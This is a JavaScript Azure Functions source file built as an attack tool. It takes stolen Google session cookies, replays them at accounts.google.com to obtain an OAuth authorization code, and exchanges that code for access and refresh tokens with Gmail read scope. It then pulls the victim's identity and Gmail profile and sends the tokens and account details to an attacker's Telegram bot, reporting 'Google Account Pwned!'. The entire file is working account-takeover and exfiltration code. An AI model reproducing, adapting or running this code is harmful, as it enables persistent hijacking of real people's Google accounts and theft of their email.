/**
 * Google Cookie Replay & Token Exchange
 * Takes stolen Google session cookies, replays them in an authorization
 * code flow at accounts.google.com, and exchanges the auth code for
 * OAuth access + refresh tokens.
 * 
 * Then queries Google APIs to enumerate the victim.
 */

const { app } = require("@azure/functions");

const client_id = process.env.GOOGLE_CLIENT_ID || "32555940559.apps.googleusercontent.com";
const authorize_endpoint = "https://accounts.google.com/o/oauth2/v2/auth";
const token_endpoint = "https://oauth2.googleapis.com/token";
const redirect_uri = "urn:ietf:wg:oauth:2.0:oob"; // Out-of-band redirect for non-web apps

const telegram_bot_token = process.env.TELEGRAM_BOT_TOKEN;
const telegram_chat_id = process.env.TELEGRAM_CHAT_ID;

async function dispatchTelegram(message) {
  if (telegram_bot_token && telegram_chat_id) {
    const url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: telegram_chat_id,
        text: message,
        parse_mode: "HTML",
      }),
    })
      .then((r) =>
        r.ok
          ? console.log("Telegram dispatch OK")
          : console.error(`Telegram dispatch failed: ${r.statusText}`)
      )
      .catch((e) => console.error("Telegram dispatch error:", e));
  }
}

app.http("execution", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "/execution",
  handler: async (request, context) => {
    const body = await request.json();
    const cookies = body.cookies; // Array of cookie strings: ["SAPISID=xxx", "SSID=yyy", ...]

    context.log(`Received ${cookies?.length || 0} cookies for replay`);

    if (!cookies || cookies.length === 0) {
      return new Response(JSON.stringify({ error: "No cookies provided" }), {
        status: 400,
        headers: { "Content-Type": "application/json" },
      });
    }

    const cookieString = cookies.join("; ");
    const scope = body.scope || "https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/gmail.readonly openid";

    try {
      // ---------- STEP 1: Authorization Code via Cookie Replay ----------
      // We send the stolen cookies to accounts.google.com and initiate an OAuth flow
      context.log("Step 1: Requesting authorization code with stolen cookies...");

      const authUrl = new URL(authorize_endpoint);
      authUrl.searchParams.set("client_id", client_id);
      authUrl.searchParams.set("response_type", "code");
      authUrl.searchParams.set("scope", scope);
      authUrl.searchParams.set("redirect_uri", redirect_uri);
      authUrl.searchParams.set("access_type", "offline"); // Get refresh token
      authUrl.searchParams.set("prompt", "none"); // Don't prompt user — use existing session

      const authResponse = await fetch(authUrl.href, {
        method: "GET",
        headers: {
          Cookie: cookieString,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
        },
        redirect: "manual",
      });

      // The auth code is in the redirect URL or in the response body
      let authCode = null;
      const location = authResponse.headers.get("location");

      if (location) {
        const locationUrl = new URL(location, authUrl.origin);
        authCode = locationUrl.searchParams.get("code");
        context.log(`Auth code from redirect: ${authCode ? "found" : "not found"}`);
      }

      // If no redirect, try parsing the response body (happens with urn:ietf:wg:oauth:2.0:oob)
      if (!authCode) {
        const responseText = await authResponse.text();
        const codeMatch = responseText.match(/code=([\w\-_./]+)/);
        if (codeMatch) {
          authCode = codeMatch[1];
          context.log("Auth code from response body");
        } else {
          // Check for error in response
          const errorMatch = responseText.match(/class="error"[^>]*>([^<]+)/);
          if (errorMatch) {
            context.error(`Google returned error: ${errorMatch[1]}`);
          }
          // Log a snippet for debugging
          context.log(`Response (first 500 chars): ${responseText.substring(0, 500)}`);
        }
      }

      if (!authCode) {
        const msg = `❌ <b>Cookie Replay Failed</b>\nCould not obtain authorization code. Cookies may be expired or require user interaction.\nCookie count: ${cookies.length}`;
        dispatchTelegram(msg);
        return new Response(JSON.stringify({ error: "No auth code obtained" }), {
          status: 401,
          headers: { "Content-Type": "application/json" },
        });
      }

      context.log(`Auth code obtained: ${authCode.substring(0, 20)}...`);

      // ---------- STEP 2: Exchange Auth Code for Tokens ----------
      context.log("Step 2: Exchanging auth code for tokens...");

      const tokenParams = new URLSearchParams({
        code: authCode,
        client_id: client_id,
        grant_type: "authorization_code",
        redirect_uri: redirect_uri,
      });

      const tokenResponse = await fetch(token_endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "GoogleAiTMFunction/1.0",
        },
        body: tokenParams.toString(),
      });

      const tokenData = await tokenResponse.json();
      context.log(`Token exchange status: ${tokenResponse.status}`);

      if (!tokenData.access_token) {
        context.error(`Token exchange failed: ${JSON.stringify(tokenData)}`);
        dispatchTelegram(
          `❌ <b>Token Exchange Failed</b>\n${JSON.stringify(tokenData)}`
        );
        return new Response(JSON.stringify(tokenData), {
          status: 400,
          headers: { "Content-Type": "application/json" },
        });
      }

      // ---------- STEP 3: Enumerate Victim ----------
      context.log("Step 3: Enumerating victim identity...");
      const accessToken = tokenData.access_token;

      // Get user info
      let userInfo = {};
      try {
        const userResp = await fetch(
          "https://www.googleapis.com/oauth2/v2/userinfo",
          {
            headers: { Authorization: `Bearer ${accessToken}` },
          }
        );
        userInfo = await userResp.json();
      } catch (e) {
        context.error("Userinfo fetch failed:", e.message);
      }

      // Get Gmail profile (confirms email access)
      let gmailProfile = {};
      try {
        const gmailResp = await fetch(
          "https://gmail.googleapis.com/gmail/v1/users/me/profile",
          {
            headers: { Authorization: `Bearer ${accessToken}` },
          }
        );
        gmailProfile = await gmailResp.json();
      } catch (e) {
        context.error("Gmail profile fetch failed:", e.message);
      }

      // ---------- BUILD REPORT ----------
      const hasRefresh = !!tokenData.refresh_token;
      let msg = `✅ <b>Google Account Pwned!</b>\n\n`;

      msg += `<b>Victim:</b> ${userInfo.email || "Unknown"}\n`;
      msg += `<b>Name:</b> ${userInfo.name || "Unknown"}\n`;
      msg += `<b>Locale:</b> ${userInfo.locale || "Unknown"}\n\n`;

      msg += `<b>Access Token:</b>\n<code>${accessToken}</code>\n\n`;

      if (hasRefresh) {
        msg += `<b>Refresh Token (persistent):</b>\n<code>${tokenData.refresh_token}</code>\n\n`;
        msg += `⏳ This refresh token can be used to get new access tokens indefinitely\n\n`;
      }

      msg += `<b>Gmail:</b> ${gmailProfile.emailAddress || "N/A"}`;
      msg += ` (${gmailProfile.messagesTotal || "?"} messages)\n`;
      msg += `<b>Scope:</b> ${tokenData.scope || scope}`;
      msg += `\n<b>Expires:</b> ${tokenData.expires_in || "?"}s`;

      if (userInfo.picture) {
        msg += `\n<b>Avatar:</b> ${userInfo.picture}`;
      }

      dispatchTelegram(msg);

      // Return tokens to caller
      return new Response(
        JSON.stringify({
          success: true,
          user: userInfo,
          gmail: gmailProfile,
          tokens: {
            access_token: accessToken,
            refresh_token: tokenData.refresh_token || null,
            id_token: tokenData.id_token || null,
            expires_in: tokenData.expires_in,
            scope: tokenData.scope,
          },
        }),
        {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            "access-control-allow-origin": "*",
          },
        }
      );
    } catch (error) {
      context.error("Execution error:", error.message);
      dispatchTelegram(`❌ <b>Execution Error</b>\n${error.message}`);
      return new Response(JSON.stringify({ error: error.message }), {
        status: 500,
        headers: { "Content-Type": "application/json" },
      });
    }
  },
});